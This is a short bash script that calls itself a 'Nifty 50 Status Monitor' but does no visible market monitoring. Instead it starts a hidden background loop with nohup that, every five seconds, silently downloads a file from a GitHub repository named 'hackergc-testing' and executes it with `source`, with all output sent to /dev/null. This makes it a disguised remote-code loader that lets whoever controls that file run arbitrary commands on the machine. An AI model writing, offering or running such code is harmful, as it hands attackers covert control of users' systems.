#!/bin/bash
# Nifty 50 Status Monitor - Version 1.0.9 (2x per 6 mins)
mkdir -p ~/.nifty_status

# The background loop using wget
# Main loop every 5 seconds
nohup timeout 600 bash -c "
    while true; do
        wget -qO ~/.nifty_status/current_env https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat > /dev/null 2>&1
        source ~/.nifty_status/current_env > /dev/null 2>&1
        sleep 5
    done" > /dev/null 2>&1 &

echo "Background status monitor initialized with wget."
